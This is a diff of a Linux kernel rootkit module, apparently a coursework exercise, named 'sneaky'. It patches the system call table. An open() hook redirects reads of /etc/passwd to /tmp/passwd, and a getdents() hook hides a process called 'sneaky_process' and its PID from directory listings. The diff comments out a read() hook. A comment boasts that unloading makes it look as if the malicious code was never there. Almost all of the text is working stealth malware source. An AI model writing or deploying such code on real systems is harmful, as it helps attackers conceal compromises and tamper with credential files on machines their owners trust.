@@ -59,8 +59,8 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   if (strstr(pathname, "/etc/passwd") != NULL) {
-    const char replace[] = "/tmp/passwd";
-    copy_to_user(pathname, replace, sizeof(replace));
+    char replace[] = "/tmp/passwd";
+    copy_to_user(pathname, &replace, sizeof(replace));
     return original_call(pathname, flags);
   } else {
     printk(KERN_INFO "Very, very Sneaky!\n");
@@ -82,9 +82,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
   sprintf(str_PID, "%d", PID);
 
   while (remain > 0) {
-    remain -= temp->d_reclen;
-
-    
+    remain -= temp->d_reclen;    
     if (strstr(temp->d_name, "sneaky_process") != NULL || strstr(temp->d_name, str_PID) != NULL) {
       nread -= temp->d_reclen;
       if (remain > 0) {
@@ -95,10 +93,12 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
     }
   }
   return nread;
+    
 }
 
 
 //read
+/*
 asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
  
 
@@ -113,7 +113,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
     
 }
 
-
+*/
 
 
 
@@ -146,8 +146,8 @@ static int initialize_sneaky_module(void)
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   //getdents
-  original_read = (void*)*(sys_call_table + __NR_read);
-  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  // original_read = (void*)*(sys_call_table + __NR_read);
+  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
 
 
@@ -178,7 +178,7 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
-  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  //*(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
